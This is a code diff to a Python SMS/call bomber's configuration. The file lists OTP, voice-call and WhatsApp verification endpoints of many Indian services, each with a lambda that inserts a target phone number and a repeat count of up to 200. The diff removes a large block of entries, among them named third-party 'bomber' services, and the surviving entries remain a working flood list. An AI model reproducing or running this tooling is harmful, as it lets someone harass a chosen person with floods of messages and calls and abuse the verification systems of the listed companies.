@@ -1757,6 +1820,7 @@ APIS = [
         "data": lambda phone: f"_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone={phone}",
         "count": 50
     },
+    
     {
         "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
         "method": "POST",
@@ -1781,6 +1845,7 @@ APIS = [
         "data": lambda phone: f"mobile={phone}",
         "count": 3
     },
+    
     {
         "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
         "method": "POST",
@@ -1801,6 +1866,7 @@ APIS = [
         "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "firstName": "Anant Ambani"}),
         "count": 50
     },
+    
     {
         "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
         "method": "POST",
@@ -1825,6 +1891,7 @@ APIS = [
         "data": lambda phone: f"phone=%2B91{phone}",
         "count": 50
     },
+    
     {
         "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
         "method": "POST",
@@ -1848,6 +1915,7 @@ APIS = [
         "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
         "count": 3
     },
+    
     {
         "url": "https://vidyakul.com/signup-otp/send",
         "method": "POST",
@@ -1872,6 +1940,7 @@ APIS = [
         "data": lambda phone: f"phone={phone}",
         "count": 3
     },
+    
     {
         "url": "https://api.woodenstreet.com/api/v1/register",
         "method": "POST",
@@ -1893,6 +1962,7 @@ APIS = [
         "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001", "lastname": "", "customer_id": ""}),
         "count": 200
     },
+    
     {
         "url": "https://www.bharatloan.com/login-sbm",
         "method": "POST",
@@ -1915,814 +1985,6 @@ APIS = [
         },
         "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
         "count": 200
-    },
-    # ============ ADDITIONAL APIS FROM TEXT FILES ============
-    # FreeFire Bomber APIs
-    {
-        "name": "FreeFire Bomber",
-        "url": lambda phone: f"https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=60",
-        "method": "GET",
-        "headers": {"User-Agent": "Mozilla/5.0"},
-        "data": None,
-        "count": 10
-    },
-    {
-        "name": "Call Bomber API",
-        "url": lambda phone: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}",
-        "method": "GET",
-        "headers": {"User-Agent": "Mozilla/5.0"},
-        "data": None,
-        "count": 10
-    },
-    {
-        "name": "Bomberr API",
-        "url": lambda phone: f"https://bomberr.onrender.com/num={phone}",
-        "method": "GET",
-        "headers": {"User-Agent": "Mozilla/5.0"},
-        "data": None,
-        "count": 10
-    },
-    {
-        "name": "Bomber Main 2",
-        "url": lambda phone: f"https://bomber-main-2.vercel.app/?key=roots&number={phone}",
-        "method": "GET",
-        "headers": {"User-Agent": "Mozilla/5.0"},
-        "data": None,
-        "count": 10
-    },
-    {
-        "name": "Bomber Main 3",
-        "url": lambda phone: f"https://bomber-main-3.vercel.app/bomb?number={phone}",
-        "method": "GET",
-        "headers": {"User-Agent": "Mozilla/5.0"},
-        "data": None,
-        "count": 10
-    },
-    {
-        "name": "SMS Bomber Subhxcosmo",
-        "url": lambda phone: f"http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}",
-        "method": "GET",
-        "headers": {"User-Agent": "Mozilla/5.0"},
-        "data": None,
-        "count": 10
-    },
-    {
-        "name": "Supabase Fast Hit",
-        "url": lambda phone: f"https://goknhwdapjjcqmcoclxi.supabase.co/functions/v1/fast-hit?phone={phone}",
-        "method": "GET",
-        "headers": {"User-Agent": "Mozilla/5.0"},
-        "data": None,
-        "count": 10
-    },
-    # Voice Call APIs from api.txt
-    {
-        "name": "Tata Capital Voice Call",
-        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
-        "count": 10
-    },
-    {
-        "name": "1MG Voice Call",
-        "url": "https://www.1mg.com/auth_api/v6/create_token",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json; charset=utf-8"},
-        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
-        "count": 10
-    },
-    {
-        "name": "Swiggy Call Verification",
-        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json; charset=utf-8"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Myntra Voice Call",
-        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Flipkart Voice Call",
-        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Amazon Voice Call",
-        "url": "https://www.amazon.in/ap/signin",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda phone: f"phone={phone}&action=voice_otp",
-        "count": 10
-    },
-    {
-        "name": "Paytm Voice Call",
-        "url": "https://accounts.paytm.com/signin/voice-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Zomato Voice Call",
-        "url": "https://www.zomato.com/php/o2_api_handler.php",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda phone: f"phone={phone}&type=voice",
-        "count": 10
-    },
-    {
-        "name": "MakeMyTrip Voice Call",
-        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Goibibo Voice Call",
-        "url": "https://www.goibibo.com/user/voice-otp/generate/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Ola Voice Call",
-        "url": "https://api.olacabs.com/v1/voice-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Uber Voice Call",
-        "url": "https://auth.uber.com/v2/voice-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 10
-    },
-    # WhatsApp APIs from api.txt
-    {
-        "name": "KPN WhatsApp",
-        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
-        "method": "POST",
-        "headers": {
-            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
-            "content-type": "application/json; charset=UTF-8"
-        },
-        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
-        "count": 10
-    },
-    {
-        "name": "Foxy WhatsApp",
-        "url": "https://www.foxy.in/api/v2/users/send_otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
-        "count": 10
-    },
-    {
-        "name": "Stratzy WhatsApp",
-        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phoneNo":"{phone}"}}',
-        "count": 10
-    },
-    {
-        "name": "Jockey WhatsApp",
-        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 10
-    },
-    {
-        "name": "Rappi WhatsApp",
-        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json; charset=utf-8"},
-        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
-        "count": 10
-    },
-    # Additional SMS APIs
-    {
-        "name": "Lenskart SMS",
-        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "NoBroker SMS",
-        "url": "https://www.nobroker.in/api/v3/account/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda phone: f"phone={phone}&countryCode=IN",
-        "count": 15
-    },
-    {
-        "name": "PharmEasy SMS",
-        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Wakefit SMS",
-        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Byju's SMS",
-        "url": "https://api.byjus.com/v2/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Hungama OTP",
-        "url": "https://communication.api.hungama.com/v1/communication/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}',
-        "count": 15
-    },
-    {
-        "name": "Meru Cab",
-        "url": "https://merucabapp.com/api/otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda phone: f"mobile_number={phone}",
-        "count": 15
-    },
-    {
-        "name": "Doubtnut",
-        "url": "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "headers": {"content-type": "application/json; charset=utf-8"},
-        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}',
-        "count": 15
-    },
-    {
-        "name": "PenPencil",
-        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
-        "method": "POST",
-        "headers": {"content-type": "application/json; charset=utf-8"},
-        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Snitch",
-        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Dayco India",
-        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
-        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp",
-        "count": 15
-    },
-    {
-        "name": "BeepKart",
-        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","city":362}}',
-        "count": 15
-    },
-    {
-        "name": "Lending Plate",
-        "url": "https://lendingplate.com/api.php",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
-        "data": lambda phone: f"mobiles={phone}&resend=Resend",
-        "count": 15
-    },
-    {
-        "name": "ShipRocket",
-        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "GoKwik",
-        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}',
-        "count": 15
-    },
-    {
-        "name": "NewMe",
-        "url": "https://prodapi.newme.asia/web/otp/request",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}',
-        "count": 15
-    },
-    {
-        "name": "Univest",
-        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "Smytten",
-        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}',
-        "count": 15
-    },
-    {
-        "name": "CaratLane",
-        "url": "https://www.caratlane.com/cg/dhevudu",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}',
-        "count": 15
-    },
-    {
-        "name": "BikeFixup",
-        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json; charset=UTF-8"},
-        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}',
-        "count": 15
-    },
-    {
-        "name": "WellAcademy",
-        "url": "https://wellacademy.in/store/api/numberLoginV2",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json; charset=UTF-8"},
-        "data": lambda phone: f'{{"contact_no":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "ServeTel",
-        "url": "https://api.servetel.in/v1/auth/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
-        "data": lambda phone: f"mobile_number={phone}",
-        "count": 15
-    },
-    {
-        "name": "GoPink Cabs",
-        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
-        "data": lambda phone: f"check_mobile_number=1&contact={phone}",
-        "count": 15
-    },
-    {
-        "name": "Shemaroome",
-        "url": "https://www.shemaroome.com/users/resend_otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
-        "data": lambda phone: f"mobile_no=%2B91{phone}",
-        "count": 15
-    },
-    {
-        "name": "Cossouq",
-        "url": "https://www.cossouq.com/mobilelogin/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda phone: f"mobilenumber={phone}&otptype=register",
-        "count": 15
-    },
-    {
-        "name": "MyImagineStore",
-        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
-        "data": lambda phone: f"mobile={phone}",
-        "count": 15
-    },
-    {
-        "name": "Otpless",
-        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}',
-        "count": 15
-    },
-    {
-        "name": "MyHubble Money",
-        "url": "https://api.myhubble.money/v1/auth/otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}',
-        "count": 15
-    },
-    {
-        "name": "Tata Capital Business",
-        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}',
-        "count": 15
-    },
-    {
-        "name": "DealShare",
-        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}',
-        "count": 15
-    },
-    {
-        "name": "Snapmint",
-        "url": "https://api.snapmint.com/v1/public/sign_up",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Housing.com",
-        "url": "https://login.housing.com/api/v2/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
-        "count": 15
-    },
-    {
-        "name": "RentoMojo",
-        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Khatabook",
-        "url": "https://api.khatabook.com/v1/auth/request-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
-        "count": 15
-    },
-    {
-        "name": "Netmeds",
-        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Nykaa",
-        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa",
-        "count": 15
-    },
-    {
-        "name": "RummyCircle",
-        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}',
-        "count": 15
-    },
-    {
-        "name": "Animall",
-        "url": "https://animall.in/zap/auth/login",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}',
-        "count": 15
-    },
-    {
-        "name": "Entri",
-        "url": "https://entri.app/api/v3/users/check-phone/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Cosmofeed",
-        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}',
-        "count": 15
-    },
-    {
-        "name": "Aakash",
-        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}',
-        "count": 15
-    },
-    {
-        "name": "Revv",
-        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}',
-        "count": 15
-    },
-    {
-        "name": "DeHaat",
-        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}',
-        "count": 15
-    },
-    {
-        "name": "A23 Games",
-        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}',
-        "count": 15
-    },
-    {
-        "name": "Spencer's",
-        "url": "https://jiffy.spencers.in/user/auth/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "PayMe India",
-        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}',
-        "count": 15
-    },
-    {
-        "name": "Shopper's Stop",
-        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}',
-        "count": 15
-    },
-    {
-        "name": "Hyuga Auth",
-        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "BigCash",
-        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
-        "method": "GET",
-        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "Lifestyle Stores",
-        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}',
-        "count": 15
-    },
-    {
-        "name": "WorkIndia",
-        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "PokerBaazi",
-        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}',
-        "count": 15
-    },
-    {
-        "name": "My11Circle",
-        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json;charset=UTF-8"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "MamaEarth",
-        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "HomeTriangle",
-        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Wellness Forever",
-        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}",
-        "count": 15
-    },
-    {
-        "name": "HealthMug",
-        "url": "https://api.healthmug.com/account/createotp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Vyapar",
-        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "Kredily",
-        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "Tata Motors",
-        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}',
-        "count": 15
-    },
-    {
-        "name": "Moglix",
-        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}',
-        "count": 15
-    },
-    {
-        "name": "MyGov",
-        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "TrulyMadly",
-        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}',
-        "count": 15
-    },
-    {
-        "name": "Apna",
-        "url": "https://production.apna.co/api/userprofile/v1/otp/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}',
-        "count": 15
-    },
-    {
-        "name": "CodFirm",
-        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "Swipe",
-        "url": "https://app.getswipe.in/api/user/mobile_login",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}',
-        "count": 15
-    },
-    {
-        "name": "More Retail",
-        "url": "https://omni-api.moreretail.in/api/v1/login/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}',
-        "count": 15
-    },
-    {
-        "name": "Country Delight",
-        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}',
-        "count": 15
-    },
-    {
-        "name": "AstroSage",
-        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "Rapido",
-        "url": "https://customer.rapido.bike/api/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
-    },
-    {
-        "name": "TooToo",
-        "url": "https://tootoo.in/graphql",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}',
-        "count": 15
-    },
-    {
-        "name": "ConfirmTkt",
-        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
-        "method": "GET",
-        "headers": {},
-        "data": None,
-        "count": 15
-    },
-    {
-        "name": "BetterHalf",
-        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}',
-        "count": 15
-    },
-    {
-        "name": "Charzer",
-        "url": "https://api.charzer.com/auth-service/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}',
-        "count": 15
-    },
-    {
-        "name": "Nuvama Wealth",
-        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}',
-        "count": 15
-    },
-    {
-        "name": "Mpokket",
-        "url": "https://web-api.mpokket.in/registration/sendOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}',
-        "count": 15
     }
 ]
 # =============== ALL APIs END ===============
